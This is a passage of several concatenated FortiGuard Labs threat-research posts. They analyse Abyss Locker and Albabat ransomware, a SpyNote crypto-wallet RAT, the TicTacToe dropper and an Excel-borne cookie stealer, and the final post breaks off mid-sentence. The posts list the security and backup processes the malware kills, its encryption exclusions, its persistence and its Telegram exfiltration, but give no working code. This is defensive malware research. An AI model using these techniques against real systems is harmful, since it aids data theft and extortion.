    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Abyss Locker (AbyssLocker) ransomware. Affected platforms:Microsoft Windows, LinuxImpacted parties:Microsoft Windows and Linux UsersImpact:Steals and encrypts victims' files and demands ransom for file decryption and not releasing the stolen data.Severity level:High Although the first Abyss Locker sample was submitted to a publicly available file scanning service in July of 2023, the first variant of the ransomware may date back further as the ransomware is based on the HelloKitty ransomware source code. A version 1 variant of the Abyss Locker ransomware targeting Windows systems was discovered in early January 2024, followed by version 2 for Windows later that month. (We were unable to locate version 1 for Linux.) We review both the Linux and Windows variants in this week’s roundup. The Abyss Locker threat actor steals victims' data before deploying and running its ransomware malware for file encryption. The ransomware is also capable of deleting Volume Shadow Copies and system backups. Information on the infection vector used by the Abyss Locker ransomware threat actor is unavailable. However, it is not likely to differ significantly from other ransomware groups. The Abyss Locker ransomware samples were submitted to a publicly available file scanning service from a variety of regions, including Europe, North America, South America, and Asia. The Windows version of the Abyss Locker ransomware version 1 performs the following actions: It stops the following services: MSSQLServerADHelper100 MSSQL$ISARS MSSQL$MSFW SQLAgent$ISARS SQLAgent$MSFW SQLBrowser ReportServer$ISARS SQLWriter WinDefend mr2kserv MSExchangeADTopology MSExchangeFBA MSExchangeIS MSExchangeSA ShadowProtectSvc SPAdminV4 SPTimerV4 SPTraceV4 SPUserCodeV4 SPWriterV4 SPSearch4 IISADMIN firebirdguardiandefaultinstance ibmiasrw QBCFMonitorService QBVSS QBPOSDBServiceV12 IBM Domino Server (CProgramFilesIBMDominodata) IBM Domino Diagnostics (CProgramFilesIBMDomino) Simply Accounting Database Connection Manager QuickBooksDB1 QuickBooksDB2 QuickBooksDB3 QuickBooksDB4 QuickBooksDB5wrapper DefWatch ccEvtMgr ccSetMgr SavRoam Sqlservr sqlagent sqladhlp Culserver RTVscan sqlbrowser SQLADHLP QBIDPService Intuit.QuickBooks.FCS msmdsrv tomcat6 zhudongfangyu vmware - usbarbitator64 vmware - converter dbsrv12 dbeng8 MSSQL$MICROSOFT##WID MSSQL$VEEAMSQL2012 SQLAgent$VEEAMSQL2012 FishbowlMySQ MySQL57 MSSQL$KAV_CS_ADMIN_KIT SQLAgent$KAV_CS_ADMIN_KIT msftesql - Exchange MSSQL$MICROSOFT##SSEE MSSQL$SBSMONITORING MSSQL$SHAREPOINT MSSQLFDLauncher$SBSMONITORING MSSQLFDLauncher$SHAREPOINT SQLAgent$SBSMONITORING SQLAgent$SHAREPOINT QBFCService YooBackup YooIT svc$ MSSQL MSSQL$ memtas mepocs sophos veeam backup bedbg PDVFSService BackupExecVSSProvider BackupExecAgentAccelerator BackupExecAgentBrowser BackupExecDiveciMediaService BackupExecJobEngine BackupExecManagementService BackupExecRPCService MVArmor MVarmor64 stc_raw_agent VSNAPVSS VeeamTransportSvc VeeamDeploymentService VeeamNFSSvc AcronisAgent ARSM AcrSch2Svc CASAD2DWebSvc CAARCUpdateSvc WSBExchange MSExchange MSExchange$ GxVss GxBlr GxFWD GxCVD GxCIMgr It then terminates the following processes: 360doctor.exe 360se.exe ADExplorer.exe ADExplorer64.exe ADExplorer64a.exe Adobe CEF.exe Adobe Desktop Service.exe AdobeCollabSync.exe AdobeIPCBroker.exe AutodeskDesktopApp.exe Autoruns.exe Autoruns64.exe Autoruns64a.exe Autorunsc.exe Autorunsc64.exe Autorunsc64a.exe AvastUI.exe BrCcUxSys.exe BrCtrlCntr.exe CNTAoSMgr.exe CagService.exe CoreSync.exe Creative Cloud.exe Culture.exe Defwatch.exe DellSystemDetect.exe EnterpriseClient.exe GDscan.exe GWCtlSrv.exe GlassWire.exe Helper.exe InputPersonalization.exe MsDtSrvr.exe MsDtsSrvr.exe MsMpEng.exe ONENOTEM.exe PccNTMon.exe ProcessHacker.exe Procexp.exe Procexp64.exe QBDBMgr.exe QBDBMgrN.exe QBIDPService.exe QBW32.exe RAgui.exe RTVscan.exe Raccine.exe RaccineElevatedCfg.exe RaccineSettings.exe Raccine_x86.exe RdrCEF.exe ReportingServicesService.exe SQLAGENT.EXE Simply.SystemTrayIcon.exe SimplyConnectionManager.exe Sqlservr.exe, Ssms.exe Sysmon.exe Sysmon64.exe SystemExplorer.exe SystemExplorerService.exe SystemExplorerService64.exe TMBMSRV.exe TeamViewer.exe TeamViewer_Service.exe TitanV, Ssms.exe TmCCSF.exe TmListen.exe TmPfw.exe TmProxy.exe Totalcmd.exe Totalcmd64.exe VeeamDeploymentSvc.exe WRSA.exe WireShark.exe ZhuDongFangYu.exe acwebbrowser.exe agntsvc.exe avp.exe avz.exe axlbridge.exe bedbh.exe benetns.exe bengien.exe beserver.exe dbeng50.exe dbsnmp.exe dumpcap.exe egui.exe encsvc.exe excel.exe fbguard.exe fbserver.exe fdhost.exe fdlauncher.exe firefox.exe httpd.exe infopath.exe isqlplussvc.exe j0gnjko1.exe java.exe msaccess.exe msftesql.exe msmdsrv.exe mspub.exe mydesktopqos.exe mydesktopservice.exe mysqld.exe node.exe notepad++.exe notepad.exe ntrtscan.exe ocautoupds.exe ocomm.exe ocssd.exe onenote.exe oracle.exe outlook.exe pg_ctl.exe postgres.exe powerpnt.exe procexp64a.exe mon.exe proc, procmon64.exe procmon64a.exe pvlsvr.exe qbupdate.exe raw_agent_svc.exe sam.exe sqbcoreservice.exe sql.exe sqlbrowser.exe sqlceip.exe sqlmangr.exe sqlservr.exe sqlwriter.exe steam.exe supervise.exe synctime.exe tbirdconfig.exe tcpview.exe tcpview64.exe tcpview64a.exe tdsskiller.exe thebat.exe thunderbird.exe tomcat6.exe tv_w32.exe tv_x64.exe visio.exe vsnapvss.exe vxmon.exe wdswfsafe.exe winword.exe wordpad.exe wsa_service.exe wxServer.exe wxServerView.exe xfssvccon.exe The ransomware uses the following commands to delete Volume Shadow Copies: It runs the following commands to set the boot status policy: The Abyss Locker ransomware encrypts files on compromised machines and adds a “.abyss” extension to the encrypted files. The Abyss Locker version 1 variant for Windows adds a random five-letter extension instead of “.abyss.” The ransomware drops a ransom note labeled “WhatHappened.txt.” The TOR site used for ransom negotiations was not accessible at the time of our investigation. It then replaces the desktop wallpaper with its own, which contains a ransom message: However, the following file encryption exception applies to the Abyss Locker ransomware: It skips encrypting files with the following extensions: .Abyss .386 .cmd .ani .adv .msi .msp .com .nls .ocx .mpa .cpl .mod .hta .prf .rtp .rpd .bin .hlp .shs .drv .wpx .bat .rom .msc .spl .msu .ics .key .exe .dllv .lnk .icov .sys .cur .idx .ini .reg .mp3 .mp4 .apk .ttf .otf .fon .fnt .dmp .tmp .pif .wav .wma .dmg .iso .app .ipa .xex .wad .icns .lock .theme .diagcfg .blf .diagcab .diagpkg .msstyles .gadget .woff .part .sfcache .winmd It also skips encrypting the following files: work.log autorun.inf boot.ini bootfont.bin bootsect.bak bootmgr bootmgr.efi bootmgfw.efi desktop.ini iconcache.db ntldr ntuser dat ntuser.dat.log ntuser.ini thumbs.db !CryptoLockerDetectionDONT-DELETE!.jpg WhatHappened.txt In addition, it avoids encrypting files in the following folders: Boot Windows Windows.old $Windows.~bt $windows.~ws windows nt msbuild microsoft perflog Microsoft – Cloud Computers Apps & Gaming microsoft shared common files windows defender windowspowershell windows security usoshared windowsapp windows journal windows photo viewer $Recycle.Bin All Users Program Files Program Files (x86) system volume information msocache Tor Browser Internet Explorer Google Opera Opera Software Mozilla Mozilla Firefox #recycle Our analysis of Abyss Locker ransomware version 2, which appeared in late January 2024, found no differences from version 1 in terms of functionality. The only differences we could find are the ransom message (including the message on the replaced wallpaper), which clearly states that it's version 2, and the TOR address used for ransom negotiation. The TOR site used by this version of Abyss Locker ransomware for ransom negotiation was still accessible at the time of our investigation. This ransomware variant runs the following run commands: The ransomware then encrypts files on the compromised machines and adds a “.crypt” extension to the encrypted files. It then creates files with a “.README_TO_RESTORE” extension, which is a ransom note. It avoids encrypting files in the following directories: /boot /dev /etc /lost+found /proc /run /usr/bin /usr/include /usr/lib /usr/lib32 /usr/lib64 /usr/sbin /sys /usr/libexec /usr/share /var/lib It also avoids encrypting files with the following extensions: .vmdk .vmsd .vmsn .crypt .README_TO_RESTORE .tmp .a .so .la Currently, the Abyss Locker ransomware threat actor does not appear to have a TOR site that exposes the victim's name and allows others to view the stolen data, although BleepingComputer previouslyreportedsuch a leak site in mid-2023. However, the threat actor does offer a ransom negotiation site on TOR. The ransom is set low for businesses and high for consumers ($282,380 in this case), making it difficult to determine who is being targeted. The Abyss Locker ransomware described in this report are detected and blocked by FortiGuard Antivirus as: FortiGate, FortiMail, FortiClient, and FortiEDR support theFortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.

Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREEFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. FortiReconis a SaaS based Digital Risk Prevention Service backed by cybersecurity experts to provide unrivaled threat intelligence on the latest threat actor activity across the dark web, providing a rich understanding of threat actors’ motivations and TTPs. The service can detect evidence of attacks in progress allowing customers to rapidly respond to and shut down active threats. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP)is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation.

    "content": "FortiGuard Labs Threat Research Affected Platform:AndroidImpacted Users:Android users with mobile crypto wallet or banking applicationsImpact:Financial LossSeverity Level:Medium Spynoteis a Remote Access Trojan that initially surfaced in 2020. Since then, it has grown into one of the most common families of malware for Android, with multiple samples, integration of other RATs (e.g. CypherRat), and a large family of over 10,000 samples. There are multiple variants and integrations of other RATs, and since 2023 there has been agrowing interestinfinancial institutions. On February 1st, we found a malicious sample posing as a legitimate crypto wallet that actually included the SpyNote RAT with several interesting additions related to anti-analysis andcryptocurrencies. Like much Android malware today, this malware abuses theAccessibility API. This API is used to automatically perform UI actions. For example, the malicious sample uses the Accessibility API to record device unlocking gestures. Newer, this SpyNote sample uses the Accessibility API to target famous crypto wallets. The following code recognizes the use of a legitimatecrypto walletand displays anoverlayover it. The injected overlay consists of a WebView whose HTML is hard-coded in Base64. If we decode the overlay, we get anHTML page for cryptocurrency transfers. Notice that the page apparently initiates a transfer between 2 hard-coded fake wallets. See below: the “…” in between the alleged wallet addresses are exactly as in the code (note that we censored the full addresses). For the malware analyst, it’s obvious they are fake.  However, it is likely the victim won’t notice because (1) the wallet identifiers always have many characters and are therefore difficult to verify, and (2) this will look as if it were displayed by the victim’s legit crypto wallet application (in reality, it is displayedoverthe real crypto wallet app, but this is not detectable). In addition, the malicious code uses the Accessibility API toautomatically fill a form and transfer a given amount of cryptocurrency to the cybercriminals. Precisely, the code performs the following tasks: All of these operations are performedautomaticallythrough the Accessibility APIwithout the user’s intervention. To gain access to the Accessibility API, all malware lure victims one way or another into giving them the necessary rights. This sample follows the same strategy. We remind end-users that they should never do this. While the Accessibility API is rightfully requested by apps to help people with disabilities, they should always be treated as highly suspicious coming from alleged crypto wallets, PDF Readers, Video Players, etc. The 2 screenshots below show (1) the SpyNote malware requesting Accessibility Service and (2) how, when you grant the desired access, the Android OS displays an additional warning window explaining the risks. It is still possible at that point to click on “Deny,” and the malware won’t gain access. Unfortunately, as soon as the victim clicks on “Allow,” it is basically “game over” because the malware can navigate, click, read, and modify any application. Besides injections into crypto wallets, the sample features an interesting, simple, but efficient anti-analysis technique. We remind users that Android Packages (APK) areZIPfiles and normally contain a Dalvik executable (classes.dex), a manifest (AndroidManifest.xml), resources, and assets. In this particular case, the sample ismalformatted: several resource files are meant to be present in the subdirectories of classes.dex and AndroidManifest.xml. But classes.dex and AndroidManifest.xml arefiles, notdirectories. Consequently, standard unzip tools fail with lots of errors, which complicates the automated analysis of the sample. After a growing interest in financial institutions,this new Android/SpyNote sample shows that malware authors are now taking into account cryptocurrencies.The capabilities of the malware are well beyond the mere spying of credentials as they can initiate cryptocurrency transfers. As for anti-analysis,while the implemented technique is simple and by-passable by a human analyst, it certainly defeats—or complicates—automated analysis, giving the malware author a little more time before detection. The sample is detected automatically by our products, and we urge Android users to pay particular attention to any application requesting the Accessibility API. Fortinet customers are already protected from this malware variant through our AntiVirus as follows: FortiGuard Labs detects the sample with the following AV signatures: Android/SpyNote.F!tr TheFortiGuard AntiVirus serviceis supported by FortiGate, FortiMail, FortiClient, and FortiEDR.

    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft Windows UsersImpact:This loader has been used to load multiple RATs and info stealers, which can lead to compromised credentials and enable further malicious activitiesSeverity Level:Medium While analyzing malware samples collected from several victims, the FortiGuard team identified a grouping of malware droppers used to deliver various final-stage payloads throughout 2023. Malware droppers are malicious software designed to deliver and execute additional malware on a victim system and are employed to obfuscate final payloads during load and initial execution. Droppers within this group employ multiple stages of obfuscated payloads loading reflectively in memory. Some of the final stage payloads we identified include Leonem, AgentTesla, SnakeLogger, RemLoader, Sabsik, LokiBot, Taskun, Androm, Upatre, and Remcos. We have named this group of payloads ‘TicTacToe dropper’ due to a common Polish language string, ‘Kolko_i_krzyzyk,’ found in multiple earlier samples of the dropper, which translates to TicTacToe in English. While not all versions of this group of droppers contain this string, commonalities in their behavior led us to this grouping. We analyzed multiple samples of this dropper. The executable malware file was usually delivered through an .iso file. From cases directly observed in the wild, these iso files were delivered to the victim via phishing as an attachment (T1566.001). This technique of packing malware inside an iso file is typically employed to avoid detection by antivirus software and as a mark-of-the-web (MOTW) bypass technique (T1553.005). The executable inside the iso had multiple layers of DLL files, which were extracted at runtime and loaded directly into memory. One layer of DLL was decoded at runtime, and the next layer of DLL was loaded and decoded by the previous layer of the DLL file. We will discuss the extraction of these obfuscated payloads in a later section. The extraction process is convoluted, so the diagram below should be referenced alongside the analysis to better understand the behavior of the dropper. We found that the same dropper has been used to distribute multiple final-stage remote access tools (RATs) for at least the last 12 months. This is shown in the following timeline diagram: To better understand the TicTacToe dropper, we performed static and dynamic analysis on several samples. The first TicTacToe dropper sample analyzed is a 32-bit executable developed in the .NET programming language called ‘ALco.exe’ (SHA-1 b6914b8fa3d0b67eb6173123652b7f0682cd24fb). Analysis of the sample identified that, on execution, the dropper extracts and loads a .NET PE DLL file directly into its current process using a runtime assembly object. This means the file is loaded directly into memory without being written to disk. The code associated with this in-memory loading can be seen in Figure 3. We then extracted the DLL at runtime and saved it as a separate file. This extracted DLL file was named ‘Hadval.dll’ in the OriginalFileName field in the file's version information. In this article, we will call this file ‘Hadval.dll’ or ‘stage2 payload’ for reference. This Hadval.dll file is a 32-bit .NET PE DLL file. This DLL file was obfuscated with version 4.1 of the DeepSea software, which differs from what was used to obfuscate the main executable (as yet undetermined). The DeepSea obfuscation resulted in unreadable function names and clear indicators of code flow obfuscation, as shown in Figure 2. Thede4dot toolwas used to subvert some of the DeepSea obfuscation. The de4dot tool is an open source (GPLv3) .NET de-obfuscator and unpacker written in C# that can often be used to restore a packed and obfuscated assembly to almost the original assembly. The de4dot tool detected that the file was obfuscated using the tool DeepSea 4.1 and then de-obfuscated much of the library to provide a cleaner version of the Hadval.dll file. We can see the output of the de4dot tool execution in Figure 5 and some of the cleaner, more readable code in Figure 6. Performing further debugging of the ‘ALco.exe’ process, we identified that the Hadval.dll code is used to extract a gzip blob. Decompressed, this gzip blob revealed another 32-bit PE DLL file and another .NET library. This stage 3 payload has the internal file name ‘cruiser.dll.’ This cruiser.dll was protected by software calledSmartAssembly, which is software provided by Redgate to protect .NET code from reverse engineering. This software claims to protect the source code of .NET applications through obfuscation and encryption and is designed to prevent intellectual property theft through code analysis. The tool ‘Detect It Easy’ shows this information, as seen in Figure 7. This cruiser.dll file was de-obfuscated using the de4dot tool to create a cleaned version of the binary DLL file. Following this de-obfuscation, we can see that the cruiser.dll file has a class named ‘Munoz.’ This class contains a function that creates a copy of the executable in the temp folder. This payload matches the description of a payload with the same name, ‘cruiser.dll,’ as described in Jai Minton's blog, where he analyzed it. We can see the code from the cleaned cruiser.dll file in Figure 8, including the ‘Munoz’ class. The code from the stage 3 DLL file (cruiser.dll) extracts, reflectively loads, and executes the stage 4 payload from the bitmap object ‘dZAu’ (a resource from the main payload). The stage 4 payload is another .NET PE DLL file with the internal name 'Farinell2.dll.’ It is obfuscated with a custom obfuscator. This stage 4 payload (Farinell2.dll) then de-obfuscates, reflectively loads, and executes the final payload. We have seen multiple variants of this dropper with different types of final payloads (e.g., Lokibot to gain credentials from numerous browsers and software in the victim machine, Remcos for remote access, etc.) Analyzing another TicTacToe dropper allows us to document some common characteristics within the malware group. This executable (SHA1: 15b3c9768a67ce0d09807627f1939c7165a3fede) was also a 32-bit .NET executable with the internal name ‘IxOQ.exe.’ This executable was not obfuscated but shares similarities with the above variant, i.e., later-stage obfuscated payloads embedded as object resources. This can be seen in the screenshot in Figure 9. The resource object has stored hexadecimal numbers as strings. A simple obfuscation was used while storing, which was to replace ‘0’ (zero) with ‘ZZ’ and replace ‘F’ with ‘YY.’ When the object string was being loaded, this string replacement was reversed to get the original hexadecimal string. This string was then converted to bytes and loaded as assembly code using the ‘Assembly.Load’ method. The resource object contents can be seen in Figure 10. When this string was de-obfuscated and extracted, it was found to be a 32-bit .NET PE DLL file like the previous sample. This stage 2 payload had the internal name of ‘Pendulum.dll.’ When the code inside ‘Pendulum.dll’ is executed, it extracts a stage 3 payload named ‘cruiser.dll.’ This is the same file name as the stage 3 payload DLL of the previous sample and uses the same loading process. This cruiser.dll extracts the stage 4 payload from the bitmap object ‘JqZn,’ a resource in the primary executable ‘lxOQ.exe.’ This and the previous sample executable files present similarly obfuscated image objects. These bitmap objects are visually similar between samples, as shown in Figure 11, where this and the last sample are compared. The payload extracted from the bitmap object was found to be another 32-bit .NET PE DLL file. This DLL file has the internal name of ‘Discompard.dll’. The code from this payload was also loaded reflectively, as in previous stage payloads. Multiple antivirus engines recognized this final payload (Discompard.dll) as the ‘Zusy Banking Trojan’ or ‘Leonem’. This ‘Zusy Trojan’ isalso known as‘TinyBanker’ or ‘Tinba’ by some researchers. We performed an analysis of another separate TicTacToe dropper sample, which drops AgentTesla malware. This executable (SHA1: af14b44a1bdbf96b8fec28236f152d410c91e807) was also a 32-bit .NET executable and also employs an identical technique to load code stored in the resource element of the file. This can be seen in Figure 12. When the resource object was checked, it was very similar to the resource object in the previous sample. It had stored hexadecimal numbers as strings, and the code used to obfuscate it was also similar, replacing ‘0’ (zero) with ‘ZZ’ and substituting ‘F’ with ‘YY.’ This is shown in Figure 13. The stage 2 payload has the internal name ‘Pendulum.dll,’ and the stage 3 payload has the name ‘cruiser.dll.’ On execution, the stage 3 payload extracts the stage 4 payload from the bitmap object ‘faLa.’ Again, the visual aspects of this embedded bitmap object match those discussed in the previous two samples. This can be seen in Figure 14. The final payload in this sample was detected as AgentTesla, a well-known RAT. In our search for any reporting on this dropper, we identified amalware analysis reportfrom Jai Minton. The second malware sample we analyzed had the same names as the payload DLL files, also as mentioned in Jai Minton’s blog. The only slight change was that the stage 2 payload was ‘Pend.dll’ in his analyzed sample, and in the second sample analyzed above, it was ‘Pendulum.dll.’ Names of other intermediate payloads (Cruiser.dll and Discompard.dll) match the payloads analyzed in Jai’s blog. In addition to these naming similarities, the dropper behavior exhibited by the sample outlined in Jai’s analysis is identical and results in the loading and execution of a Remcos executable. We analyzed multiple common characteristics in the different TicTacToe dropper samples. Here are some common characteristics: This dropper delivers multiple types of final payloads. As a result, we do not believe a single threat actor group uses this dropper. Instead, it is used as a tool that may be sold as a service to threat actors. We discovered that samples distributed at the beginning of 2023 contained the strings TicTacToe (Kolko_i_krzyzyk). Later campaigns had different unique strings common across the same campaigns but distributed different final-stage payloads. Some of the strings include: ‘MatrixEqualityTestDetail,’ ‘QuanLyCafe,’ ‘Pizza_Project,’ ‘Kakurasu,’ ‘BanHang_1’, ‘ChiuMartSAIS,’ etc. This indicates that the dropper tool is in constant development, and developers are trying to evade the string-based analysis of their malware dropper. By understanding the operation of this dropper and implementing solutions that can prevent its execution, organizations will be able to prevent the execution of a variety of final-stage payloads before they can be loaded. Since each iteration of the dropper contains a different final payload, each would have a different hash. As a result, while hash-based detections are still effective at mitigating known campaigns that employ this loader, a behavior-based endpoint security tool is required to detect new campaigns due to the dynamic nature of this malware. Multistage payload extraction and in-memory execution behaviors exhibited by this dropper are anomalous compared to normal application execution, and this type of behavior should be detected and blocked by EDR technology such as FortiEDR. The behavior discussed in this article outlines the behavior of the dropper component of analyzed samples rather than the final payload. Additional samples related to previous known campaigns involving this dropper can be found in VirusTotal by searching for ‘fortinet:MSIL/Kryptik.AIJY!tr OR fortinet:MSIL/GenKryptik.GLXZ!tr OR fortinet:MSIL/GenKryptik.GCRZ!tr’ or by browsing the public collection here:https://www.virustotal.com/gui/collection/a5a5b60edcbbb203cb1965b1d544b74c47284e015ffd50312de0a251141bfbd7/iocs. As highlighted above, the loader described in this report is used to deploy a variety of final payloads. Each of these final payloads is typically tracked byFortiGuard Antivirusseparately, but all instances of this loader can be tracked through the following trackers: MSIL/Kryptik.AIJY!trMSIL/GenKryptik.GLXZ!trMSIL/GenKryptik.GCRZ!tr FortiEDRblocks the reflective loading behavior of this loader, preventing it from loading its final-stage payload. FortiEDR is also able to extract in-memory loaded artifacts to assist with triaging an infection by this dropper.

    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High In January 2024, FortiGuard Labs obtained an Excel document distributing an info-stealer. From the fingerprints in this attack, it is related to a Vietnamese-based group that wasfirst reportedon in August 2023 andagainin September. The attack stages before the info-stealer are simple downloaders that increase the difficulty of detection. This article introduces each stage in this attack and provides a glimpse into the world behind the malware campaign. The first stage of this attack is an Excel document with a VBA script that executes a PowerShell command to download a Windows Update.bat from filebin.net. Figure 3 is a screenshot of the Windows Update.bat, protected by the Abobus obfuscator. Obfuscations such as variables whose names contain non-English characters and “^” escape characters are inserted into the original code. Additionally, variable expansions (%variable:~start,length% )were used to replace the alphabet in the original code. Figure 4 is the malicious part of the original code, which downloads and executes test.vbs in the next stage. Test.vbs is roughly the same as the middle stage of the campaign reported in August 2023. It downloads three files: script.py Information stealer. Document.zip Python 3.11 with libraries for script.py. bypass.vbs Executes script.py with the downloaded Python. Script.py is obfuscated by PyObfuscate, which means it needs extra modules to be executed properly. Document.zip is downloaded to solve this problem. In addition, test.vbs creates a value named “WinUpdater” within the registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run to automatically run bypass.vbs when the victim logs in. Unlike the info-stealer described in the August 2023 report, script.py only collects browsers' cookies and login data. It extracts data from a wide range of browsers, from familiar browsers such as Chrome and Edge to browsers focused on the local market, like the Cốc Cốc browser. The collected data is compressed into a zip file, which will be sent to the attacker’s telegram bot with a message containing the date, victim’s country, IP address, language, password count, and cookie count. Furthermore, a watermark in the message sent to the bot links to a telegram channel that provides hacking tools and sensitive information. Though it is not directly relevant to this campaign group, it still gives a fresh example of how stolen information is spread. As we mentioned, many stages of this attack are downloaded from an open platform. This gives us a chance to gather more information about this hacker group. Apart from the files in the infection vectors, files sharing several commonalities with this campaign were also uploaded. For example, obfuscated batch files and VBScript files executing PowerShell code whose code is identical to Windows Update.bat and test.vbs. From those downloaders, we found more repositories related to this hacker group. In addition, there is malware probably used in other campaigns loaded on the repositories, including XWorm, VenomRat, RedLine, etc. We also found clues to another campaign from the telegram bot that receives the victim’s information. As Figure 10 shows, the threat actor cheated the victim into enabling macros in a Word document named “done 300coki.docm.” Though we couldn’t obtain the file named in Figure 10, the file name dropped a hint that they used cookies as a lure. Moreover, we found another Word document containing Facebook cookies and a malicious macro in the chat history. Like the Excel document we mentioned previously, the macro downloads an obfuscated batch file, which downloads the next stage of the attack. However, the infection vector was divided into more pieces, as Figure 12 shows. The dll files are extracted from image files. The data is base64-encoded and appended to a jpg file. The payload is XWorm, which we also found variants of on the GitHub repositories mentioned in the Abused Open Platforms section. The threat actors separate the malware campaign into several simple downloaders and use open platforms to avoid detection. However, this also provided clues to identify the hacker group. From the information left in the files, we also found files abused in other campaigns and the SNS platforms being abused to distribute malware. Such services not only provide a convenient environment for people but are commonly used by threat actors. The malware described in this report are detected and blocked byFortiGuard Antivirusas: VBA/Agent.ZCI!trMSIL/Injector.UWS!trVBA/Agent.4C99!tr.dldrVBS/Agent.HLI!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service.

    "title": "Ransomware Roundup - Albabat",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-albabat",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Albabat ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts victims' files and demands ransom for file decryptionSeverity level:High Albabat, also known as White Bat, is a financially motivated ransomware variant written in Rust that identifies and encrypts files important to the user and demands a ransom to release them. It first appeared in November 2023 with the variant Version 0.1.0. Version 0.3.0 was released in late December, followed by version 0.3.3 in mid-January 2024. The Albabat ransomware appears to be distributed as rogue software, such as a fake Windows 10 digital activation tool and a cheat program for the Counter-Strike 2 game. The Albabat ransomware samples were submitted to a publicly available file scanning service, and it appears to be primarily targeting companies and individuals in Argentina, Brazil, the Czech Republic, Germany, Hungary, Kazakhstan, Russia, and the United States. But because it is being distributed as fake software, the ransomware can affect anyone. Once the Albabat ransomware is executed, it looks for files to encrypt. It avoids encrypting the following file types: N2PK abbt arc arz bik bin bk2 cab cat cur dat desktop dll inf ini lib lnk log mp2 msi nfo otf pdb pkg pkr pyd qt resource sfx sig so swf tcl tmp ttf url vc vdf vfont vpk whl win wma woff woff2 xnb Additional file types listed below are excluded from encryption in versions 0.3.0 and 0.3.3: CHK _pth cmd com icls ico idx mod mp3 ogg pickle src theme vhdx vscdb ~$ dic lock mui pyc smc srm Note that the file types highlighted in light green are excluded in version 0.3.0. The file types highlighted in light yellow are additional files excluded in version 0.3.3. Files encrypted by the Albabat ransomware are given a “.abbt” file extension. The ransomware also replaces the desktop wallpaper with its own. The Albabat ransomware’s wallpaper claims it supports Windows and Linux platforms. However, we have not been able to locate Linux samples. Since the ransomware is written in the Rust language, which can be cross-compiled from one operating system to another, it's possible that a Linux version will be released in the future. Version 0.1.0 tries to terminate Chrome.exe. Starting with version 0.3.0, the ransomware also attempts to terminate the following additional processes: taskmgr.exe code.exe excel.exe powerpnt.exe winword.exe msaccess.exe mspub.exe chrome.exe cs2.exe (the game Counter Strike 2) steam.exe onedrive.exe postgres.exe mysqlworkbench.exe outlook.exe windowsterminal.exe sublime_text.exe Version 0.3.0 and later also stops the following services: MySQL57 MySQL80 MySQL82 postgresql-x64-14 postgresql-x64-15 Starting with version 0.3.0, the ransomware may steal from or modify the following files: AppData\\Roaming\\Electrum\\wallets AppData\\Roaming\\JetBrains AppData\\Local\\Microsoft\\OneDrive C:\\Program Files (x86)\\Steam\\steamapps\\common\\Counter-Strike Global Offensive\\game\\csgo\\cfg D:\\Games\\steamapps\\common\\Counter-Strike Global Offensive\\game\\csgo\\cfg D:\\Steam\\steamapps\\common\\Counter-Strike Global Offensive\\game\\csgo\\cfg Version 0.3.3 adds the following entries to the Windows Hosts file to block access to certain sites: Once the encryption process is finished, the ransomware drops the following files: Version 0.1.0 Version 0.3.0 Version 0.3.3 The README.html file is a ransom note instructing victims to email the attacker. It demands 0.0015 Bitcoin (approximately $64 US) for file decryption. The ransom notes dropped by versions 0.1.0, 0.3.0, and 0.3.3 are significantly different except for the format. The ransom note has a translation option that uses the Google Translate service, allowing it to be translated into over 100 languages. When the translation option is selected, Portuguese is automatically selected as the translation language, which may indicate that this is the primary language of the ransomware developer. Files larger than 5MB were not encrypted in our test environments, as per the ransom note. The FAQ option opens FAQ.html, which does not differ much between variants except for item 